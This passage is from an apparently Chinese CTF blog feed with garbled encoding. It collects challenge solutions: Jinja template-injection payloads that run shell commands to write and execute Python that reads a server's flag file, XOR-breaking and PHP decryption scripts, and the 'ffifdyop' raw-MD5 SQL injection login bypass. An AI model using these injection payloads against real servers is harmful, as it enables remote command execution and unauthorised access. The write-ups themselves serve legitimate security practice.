<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name=%7B%7B%20config[%27RUNCMD%27](%27echo aW1wb3J0IG9zCmZvciAoZGlycGF0aCxkaXJuYW1lLG5hbWUpIGluIG9zLndhbGsoJy92YXIvd3d3L2h0bWwnKToKCXByaW50IG5hbWUKCXByaW50IGRpcnBhdGg=|base64 -d &gt; /tmp/finall.py%27,shell=True)%20%7D%7D</span><br><span class="line"></span><br><span class="line">name=%7B%7B%20config[%27RUNCMD%27](%27python /tmp/finall.py%27,shell=True)%20%7D%7D</span><br><span class="line"></span><br><span class="line">base64: </span><br><span class="line">import os</span><br><span class="line">for (dirpath,dirname,name) in os.walk(&apos;/var/www/html&apos;):</span><br><span class="line">	print name</span><br><span class="line">	print dirpath</span><br></pre></td></tr></table></figure>
<p><code>name=%7B%7B%20config[%27RUNCMD%27] (%27echo cHJpbnQgb3BlbignL3Zhci93d3cvaHRtbC9mbDRnJywncicpLnJlYWQoKQ==|base64 -d&gt;/tmp/get.py%27,shell=True)%20%7D%7D</code> base64ç çš„å†…å®¹æ˜¯<code>print open('/var/www/html/fl4g','r').read()</code> ã€‚</p>
<p>æ‰§è¡Œpy<br>
<code>name=%7B%7B%20config[%27RUNCMD%27] (%27python /tmp/get.py%27,shell=True)%20%7D%7D</code></p>
]]></content>
      <categories>
        <category>é¢˜å‹è®°å½•</category>
      </categories>
  </entry>
  <entry>
    <title>crypto[working forever]</title>
    <url>/2019/04/22/crypto/</url>
    <content><![CDATA[<h2 id="De1ctf2019-xorzz">De1ctf2019 xorzz</h2>
<p>æºç </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#  from data import flag,plain</span></span><br><span class="line"></span><br><span class="line">plain = <span class="string">"dd"</span></span><br><span class="line">flag = <span class="string">"de1ctf&#123;testflag&#125;"</span></span><br><span class="line">key=flag.strip(<span class="string">"de1ctf&#123;"</span>).strip(<span class="string">"&#125;"</span>)</span><br><span class="line"><span class="keyword">assert</span>(len(key)&lt;<span class="number">38</span>)</span><br><span class="line"></span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line"></span><br><span class="line">ki=cycle(key)</span><br><span class="line">si=cycle(salt)</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">''</span>.join([hex(ord(p) ^ ord(next(ki)) ^ ord(next(si))) <span class="keyword">for</span> p <span class="keyword">in</span> plain])</span><br><span class="line"><span class="keyword">print</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="comment"># output:</span></span><br><span class="line"><span class="comment"># 49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c</span></span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆå°†å¯†æ–‡ä¸­çš„ç›åˆ†å»æ‰ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">output=<span class="string">'49380d773440222d1b421b3060380c3f403c3844791b202651306721135b6229294a3c3222357e766b2f15561b35305e3c3b670e49382c295c6c170553577d3a2b791470406318315d753f03637f2b614a4f2e1c4f21027e227a4122757b446037786a7b0e37635024246d60136f7802543e4d36265c3e035a725c6322700d626b345d1d6464283a016f35714d434124281b607d315f66212d671428026a4f4f79657e34153f3467097e4e135f187a21767f02125b375563517a3742597b6c394e78742c4a725069606576777c314429264f6e330d7530453f22537f5e3034560d22146831456b1b72725f30676d0d5c71617d48753e26667e2f7a334c731c22630a242c7140457a42324629064441036c7e646208630e745531436b7c51743a36674c4f352a5575407b767a5c747176016c0676386e403a2b42356a727a04662b4446375f36265f3f124b724c6e346544706277641025063420016629225b43432428036f29341a2338627c47650b264c477c653a67043e6766152a485c7f33617264780656537e5468143f305f4537722352303c3d4379043d69797e6f3922527b24536e310d653d4c33696c635474637d0326516f745e610d773340306621105a7361654e3e392970687c2e335f3015677d4b3a724a4659767c2f5b7c16055a126820306c14315d6b59224a27311f747f336f4d5974321a22507b22705a226c6d446a37375761423a2b5c29247163046d7e47032244377508300751727126326f117f7a38670c2b23203d4f27046a5c5e1532601126292f577776606f0c6d0126474b2a73737a41316362146e581d7c1228717664091c'</span></span><br><span class="line"></span><br><span class="line">salt=<span class="string">"WeAreDe1taTeam"</span></span><br><span class="line"></span><br><span class="line">sa = cycle(salt)</span><br><span class="line">out = output.decode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">    res += chr(ord(i) ^ ord(next(sa)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#  print b64encode(res.encode('hex'))</span></span><br><span class="line"><span class="keyword">print</span> b64encode(res)</span><br></pre></td></tr></table></figure>
<p>å»æ‰ç›åˆ†ä¹‹åï¼Œé—®é¢˜å°±å˜æˆäº†æ±‰æ˜æ–‡å¯†ç ã€‚åŸç†è§åšå®¢https://www.anquanke.com/post/id/161171#h2-0<br>
è¿™é‡Œç›´æ¥ä¸Šè„šæœ¬äº†ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"></span><br><span class="line">CHARACTER_FREQ = &#123;</span><br><span class="line">    <span class="string">'a'</span>: <span class="number">0.0651738</span>, <span class="string">'b'</span>: <span class="number">0.0124248</span>, <span class="string">'c'</span>: <span class="number">0.0217339</span>, <span class="string">'d'</span>: <span class="number">0.0349835</span>, <span class="string">'e'</span>: <span class="number">0.1041442</span>, <span class="string">'f'</span>: <span class="number">0.0197881</span>, <span class="string">'g'</span>: <span class="number">0.0158610</span>,</span><br><span class="line">    <span class="string">'h'</span>: <span class="number">0.0492888</span>, <span class="string">'i'</span>: <span class="number">0.0558094</span>, <span class="string">'j'</span>: <span class="number">0.0009033</span>, <span class="string">'k'</span>: <span class="number">0.0050529</span>, <span class="string">'l'</span>: <span class="number">0.0331490</span>, <span class="string">'m'</span>: <span class="number">0.0202124</span>, <span class="string">'n'</span>: <span class="number">0.0564513</span>,</span><br><span class="line">    <span class="string">'o'</span>: <span class="number">0.0596302</span>, <span class="string">'p'</span>: <span class="number">0.0137645</span>, <span class="string">'q'</span>: <span class="number">0.0008606</span>, <span class="string">'r'</span>: <span class="number">0.0497563</span>, <span class="string">'s'</span>: <span class="number">0.0515760</span>, <span class="string">'t'</span>: <span class="number">0.0729357</span>, <span class="string">'u'</span>: <span class="number">0.0225134</span>,</span><br><span class="line">    <span class="string">'v'</span>: <span class="number">0.0082903</span>, <span class="string">'w'</span>: <span class="number">0.0171272</span>, <span class="string">'x'</span>: <span class="number">0.0013692</span>, <span class="string">'y'</span>: <span class="number">0.0145984</span>, <span class="string">'z'</span>: <span class="number">0.0007836</span>, <span class="string">' '</span>: <span class="number">0.1918182</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_repeat_key</span><span class="params">(key,string)</span>:</span></span><br><span class="line">	key_len=len(key)</span><br><span class="line">	result=<span class="string">''</span></span><br><span class="line">	str_result=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> index,ch <span class="keyword">in</span> enumerate(string):</span><br><span class="line">		n=index%key_len</span><br><span class="line">		b=chr(ord(key[n])^ord(ch))</span><br><span class="line">		str_result+=b</span><br><span class="line">	<span class="keyword">return</span> str_result</span><br><span class="line"></span><br><span class="line"><span class="comment">#è·å¾—æ¦‚ç‡åˆ†æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_score</span><span class="params">(string)</span>:</span></span><br><span class="line">	score=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">		char=char.lower()</span><br><span class="line">		<span class="keyword">if</span> char <span class="keyword">in</span> CHARACTER_FREQ:</span><br><span class="line">			score+=CHARACTER_FREQ[char]</span><br><span class="line">	<span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å°†hexçš„æ¯ä¸ªå­—ç¬¦ä¸å¤‡é€‰å¯†é’¥è¿›è¡Œxor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">single_xor</span><span class="params">(candidate_key,hex_string)</span>:</span></span><br><span class="line">	result=<span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> hex_string:</span><br><span class="line">		b=chr(candidate_key^ord(i))</span><br><span class="line">		result+=b</span><br><span class="line">	<span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#éå†å¤‡é€‰å¯†é’¥</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Traversal_singlechar</span><span class="params">(hex_string)</span>:</span></span><br><span class="line">	candidate=[]</span><br><span class="line">	<span class="keyword">for</span> candidate_key <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		plaintext=single_xor(candidate_key,hex_string)</span><br><span class="line">		score=get_score(plaintext)</span><br><span class="line">		result=&#123;</span><br><span class="line">		<span class="string">'score'</span>:score,</span><br><span class="line">		<span class="string">'plaintext'</span>:plaintext,</span><br><span class="line">		<span class="string">'key'</span>:candidate_key</span><br><span class="line">		&#125;</span><br><span class="line">		candidate.append(result)</span><br><span class="line">	<span class="keyword">return</span> sorted(candidate,key=<span class="keyword">lambda</span> c:c[<span class="string">'score'</span>])[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(a_str,b_str)</span>:</span></span><br><span class="line">	dist=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> x,y <span class="keyword">in</span> zip(a_str,b_str):</span><br><span class="line">		b=bin(ord(x)^ord(y)) <span class="comment">#è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼ˆä»¥å­—ç¬¦ä¸²å½¢å¼è¡¨ç¤ºï¼Œå¦‚â€œ0b100000â€ï¼Œ0bè¡¨ç¤ºäºŒè¿›åˆ¶ï¼‰</span></span><br><span class="line">		dist+=b.count(<span class="string">'1'</span>)</span><br><span class="line">	<span class="keyword">return</span> dist</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_keysize</span><span class="params">(string)</span>:</span></span><br><span class="line">	normals=[]</span><br><span class="line">	<span class="keyword">for</span> keysize <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">40</span>):</span><br><span class="line">		blocks=[]</span><br><span class="line">		cnt=<span class="number">0</span></span><br><span class="line">		distance=<span class="number">0</span></span><br><span class="line">		<span class="comment">#æ ¹æ®å»ºè®®è·å¾—å››ä¸ªblockï¼Œå°†è¿™å››ä¸ªblockä¸¤ä¸¤å¾—åˆ°hamming_distanceã€‚</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(string),keysize):</span><br><span class="line">			cnt+=<span class="number">1</span></span><br><span class="line">			blocks.append(string[i:i+keysize])</span><br><span class="line">			<span class="keyword">if</span> cnt==<span class="number">4</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">		pairs=itertools.combinations(blocks,<span class="number">2</span>)</span><br><span class="line">		<span class="keyword">for</span> (x,y) <span class="keyword">in</span> pairs:</span><br><span class="line">			distance+=hamming_distance(x,y)</span><br><span class="line">		<span class="comment">#å¹³å‡ä¸€ä¸‹</span></span><br><span class="line">		distance=distance/(<span class="number">6.0</span>)</span><br><span class="line">		<span class="comment">#Normalize this result by dividing by KEYSIZE.</span></span><br><span class="line">		normal_distance=distance/keysize</span><br><span class="line">		key=&#123;</span><br><span class="line">		<span class="string">'keysize'</span>:keysize,</span><br><span class="line">		<span class="string">'distance'</span>:normal_distance</span><br><span class="line">		&#125;</span><br><span class="line">		normals.append(key)</span><br><span class="line">		<span class="comment">#print key</span></span><br><span class="line">	<span class="comment">#é€‰3ä¸ªæœ€å°çš„ä¸ºå¾…é€‰çš„keysize</span></span><br><span class="line">	candidate_keysize=sorted(normals,key=<span class="keyword">lambda</span> c:c[<span class="string">'distance'</span>])[<span class="number">0</span>:<span class="number">3</span>]</span><br><span class="line">	<span class="keyword">return</span> candidate_keysize</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess_key</span><span class="params">(keysize,string)</span>:</span></span><br><span class="line">	now_str=<span class="string">''</span></span><br><span class="line">	key=<span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(keysize):</span><br><span class="line">		now_str=<span class="string">''</span></span><br><span class="line">		<span class="keyword">for</span> index,ch <span class="keyword">in</span> enumerate(string):</span><br><span class="line">			<span class="keyword">if</span> index%keysize==i:</span><br><span class="line">				now_str+=ch</span><br><span class="line">		<span class="comment">#è·å¾—keyçš„ç¬¬iä½çš„å€¼,è½¬æ¢ä¸ºå­—ç¬¦</span></span><br><span class="line">		<span class="comment">#print now_str</span></span><br><span class="line">		key+=chr(Traversal_singlechar(now_str)[<span class="string">'key'</span>])</span><br><span class="line">	<span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plaint</span><span class="params">(string)</span>:</span></span><br><span class="line">	keysize_list=guess_keysize(string)</span><br><span class="line">	candidate_key=[]</span><br><span class="line">	possible_plaints=[]</span><br><span class="line">	<span class="keyword">for</span> keysize <span class="keyword">in</span> keysize_list:</span><br><span class="line">		key=guess_key(keysize[<span class="string">'keysize'</span>],string)</span><br><span class="line">		<span class="comment">#print key</span></span><br><span class="line">		possible_plaints.append((xor_repeat_key(key,string),key))</span><br><span class="line"></span><br><span class="line">	<span class="string">'''</span></span><br><span class="line"><span class="string">	for i in possible_plaints:</span></span><br><span class="line"><span class="string">		print i[1]</span></span><br><span class="line"><span class="string">		print get_score(i[0].decode('hex'))</span></span><br><span class="line"><span class="string">		print len(i[0])</span></span><br><span class="line"><span class="string">		print i[0].decode('hex')</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> sorted(possible_plaints,key=<span class="keyword">lambda</span> c:get_score(c[<span class="number">0</span>]))[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="keyword">assert</span> hamming_distance(<span class="string">'this is a test'</span>, <span class="string">'wokka wokka!!!'</span>) == <span class="number">37</span></span><br><span class="line">	contents=open(<span class="string">'6.txt'</span>).read()</span><br><span class="line">	<span class="comment">#base64è§£ç </span></span><br><span class="line">	string=str(contents).decode(<span class="string">'base64'</span>)</span><br><span class="line">	result=get_plaint(string)</span><br><span class="line">	<span class="keyword">print</span> result[<span class="number">0</span>]</span><br><span class="line">	<span class="keyword">print</span> result[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>
<p>6.txtä¸­çš„å†…å®¹æ˜¯å»ç›åˆ†ä¹‹åçš„å¯†æ–‡base64ä¹‹åçš„å†…å®¹ã€‚</p>
<p>å†é™„ä¸Šhctf2018ä¸­å¤©æ¢çš„è„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bxor</span><span class="params">(a, b)</span>:</span>     <span class="comment"># xor two byte strings of different lengths</span></span><br><span class="line">    <span class="keyword">if</span> len(a) &gt; len(b):</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a[:len(b)], b)])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> zip(a, b[:len(a)])])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hamming_distance</span><span class="params">(b1, b2)</span>:</span></span><br><span class="line">    differing_bits = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> bxor(b1, b2):</span><br><span class="line">        differing_bits += bin(byte).count(<span class="string">"1"</span>)</span><br><span class="line">    <span class="keyword">return</span> differing_bits</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">break_single_key_xor</span><span class="params">(text)</span>:</span></span><br><span class="line">    key = <span class="number">0</span></span><br><span class="line">    possible_space=<span class="number">0</span></span><br><span class="line">    max_possible=<span class="number">0</span></span><br><span class="line">    letters = string.ascii_letters.encode(<span class="string">'ascii'</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">        maxpossible = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> range(<span class="number">0</span>, len(text)):</span><br><span class="line">            <span class="keyword">if</span>(a == b):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            c = text[a] ^ text[b]</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> letters <span class="keyword">and</span> c != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maxpossible += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> maxpossible&gt;max_possible:</span><br><span class="line">            max_possible=maxpossible</span><br><span class="line">            possible_space=a</span><br><span class="line">    key = text[possible_space]^ <span class="number">0x20</span></span><br><span class="line">    <span class="keyword">return</span> chr(key)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">text = <span class="string">''</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"6.txt"</span>,<span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">        text += line</span><br><span class="line"><span class="comment">#  b = base64.b64decode(text)</span></span><br><span class="line">    b = text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">normalized_distances = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE <span class="keyword">in</span> range(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    b1 = b[: KEYSIZE]</span><br><span class="line">    b2 = b[KEYSIZE: KEYSIZE * <span class="number">2</span>]</span><br><span class="line">    b3 = b[KEYSIZE * <span class="number">2</span>: KEYSIZE * <span class="number">3</span>]</span><br><span class="line">    b4 = b[KEYSIZE * <span class="number">3</span>: KEYSIZE * <span class="number">4</span>]</span><br><span class="line">    b5 = b[KEYSIZE * <span class="number">4</span>: KEYSIZE * <span class="number">5</span>]</span><br><span class="line">    b6 = b[KEYSIZE * <span class="number">5</span>: KEYSIZE * <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line">    normalized_distance = float(</span><br><span class="line">        hamming_distance(b1, b2) +</span><br><span class="line">        hamming_distance(b2, b3) +</span><br><span class="line">        hamming_distance(b3, b4) +</span><br><span class="line">        hamming_distance(b4, b5) + </span><br><span class="line">        hamming_distance(b5, b6) </span><br><span class="line">    ) / (KEYSIZE * <span class="number">5</span>)</span><br><span class="line">    normalized_distances.append(</span><br><span class="line">        (KEYSIZE, normalized_distance)</span><br><span class="line">    )</span><br><span class="line">normalized_distances = sorted(normalized_distances,key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> KEYSIZE,_ <span class="keyword">in</span> normalized_distances[:<span class="number">5</span>]:</span><br><span class="line">    block_bytes = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> range(KEYSIZE)]</span><br><span class="line">    <span class="keyword">for</span> i, byte <span class="keyword">in</span> enumerate(b):</span><br><span class="line">        block_bytes[i % KEYSIZE].append(byte)</span><br><span class="line">    keys = <span class="string">''</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> bbytes <span class="keyword">in</span> block_bytes:</span><br><span class="line">            keys += break_single_key_xor(bbytes)</span><br><span class="line">        key = bytearray(keys * len(b), <span class="string">"utf-8"</span>)</span><br><span class="line">        plaintext = bxor(b, key)</span><br><span class="line">        print(<span class="string">"keysize:"</span>, KEYSIZE)</span><br><span class="line">        print(<span class="string">"key is:"</span>, keys, <span class="string">"n"</span>)</span><br><span class="line">        s = bytes.decode(plaintext)</span><br><span class="line">        print(s)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<h2 id="MD5">MD5</h2>
<h3 id="PHP-encrypto-1">PHP_encrypto_1</h3>
<p>source code:::</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($data,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5(<span class="string">'ISCC'</span>);</span><br><span class="line">    $x = <span class="number">0</span>;</span><br><span class="line">    $len = strlen($data);</span><br><span class="line">    $klen = strlen($key);</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($x == $klen)</span><br><span class="line">        &#123;</span><br><span class="line">            $x = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $char .= $key[$x];</span><br><span class="line">        $x+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">        $str .= chr((ord($data[$i]) + ord($char[$i])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//the result is fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=</span></span><br></pre></td></tr></table></figure>
<p>solving:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">#'ISCC'md5ä¹‹åçš„ç»“æœ</span></span><br><span class="line">    $mkey =<span class="string">'729623334f0aa2784a1599fd374c120d'</span>;</span><br><span class="line">    $target=<span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>;</span><br><span class="line">    $target=base64_decode($target);</span><br><span class="line"></span><br><span class="line">    $target_ay=<span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($target);$i++) &#123;</span><br><span class="line">        <span class="keyword">echo</span> ord($target[$i]).<span class="string">' '</span>;</span><br><span class="line">        array_push($target_ay,ord($target[$i]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"||||||||"</span>;</span><br><span class="line">    $j=<span class="number">0</span>;</span><br><span class="line">    $realkey_ay=<span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">for</span> ($i=<span class="number">0</span>;$i&lt;strlen($target);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ($j==strlen($mkey))&#123;</span><br><span class="line">            $j=<span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> ord($mkey[$j]).<span class="string">' '</span>;</span><br><span class="line">        array_push($realkey_ay,ord($mkey[$j]));</span><br><span class="line">        $j++;</span><br><span class="line">    &#125;</span><br><span class="line">    $flag1=<span class="string">''</span>;</span><br><span class="line">    $flag2=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($target_ay <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        $i=$key;</span><br><span class="line">        $dd=$value;</span><br><span class="line">        $od=$realkey_ay[$i];</span><br><span class="line">        $flag1.=chr($dd+<span class="number">128</span>-$od);</span><br><span class="line">        $flag2.=chr($dd-$od);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> $flag1;</span><br><span class="line">    <span class="keyword">echo</span> $flag2;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="easy-login-background">easy login background</h3>
<p><a href="http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php" target="_blank" rel="noopener">link of the problem</a></p>
<p>press the ctrl+u to check the source code:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- $password=$_POST['password'];</span></span><br><span class="line"><span class="comment">	$sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";</span></span><br><span class="line"><span class="comment">	$result=mysqli_query($link,$sql);</span></span><br><span class="line"><span class="comment">		if(mysqli_num_rows($result)&gt;0)&#123;</span></span><br><span class="line"><span class="comment">			echo 'flag is :'.$flag;</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		else&#123;</span></span><br><span class="line"><span class="comment">			echo 'å¯†ç é”™è¯¯!';</span></span><br><span class="line"><span class="comment">		&#125; --&gt;</span></span><br></pre></td></tr></table></figure>
<p>md5($password,true) calculate md5-value;<br>
and there is a string make the sql require as :</p>
<blockquote>
<p>SELECT * FROM admin WHERE username = â€˜adminâ€™ and password = â€˜â€™ or 6â€¦</p>
</blockquote>
<p>and this string is :<br>
** ffifdyop **</p>
<h1>cbc å­—èŠ‚åè½¬</h1>
<h2 id="javisoj-xman-2019-xbitf">javisoj xman 2019 xbitf</h2>
<p>æºä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Unbuffered</span><span class="params">(object)</span>:</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">       self.stream = stream</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">       self.stream.write(data)</span><br><span class="line">       self.stream.flush()</span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, attr)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> getattr(self.stream, attr)</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.stdout = Unbuffered(sys.stdout)</span><br><span class="line"><span class="comment">#import signal</span></span><br><span class="line"><span class="comment">#signal.alarm(600)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">flag=open(<span class="string">"/root/xbitf/flag"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_cbc</span><span class="params">(key,iv,m)</span>:</span></span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.encrypt(m).encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_cbc_dec</span><span class="params">(key,iv,c)</span>:</span></span><br><span class="line">    handler=AES.new(key,AES.MODE_CBC,iv)</span><br><span class="line">    <span class="keyword">return</span> handler.decrypt(c.decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line">key=os.urandom(<span class="number">16</span>)</span><br><span class="line">iv=os.urandom(<span class="number">16</span>)</span><br><span class="line">session=os.urandom(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">token=<span class="string">"session="</span>+session.encode(<span class="string">"hex"</span>)+<span class="string">";admin=0"</span></span><br><span class="line"> </span><br><span class="line">checksum=aes_cbc(key,iv,token)</span><br><span class="line"><span class="keyword">print</span> token+<span 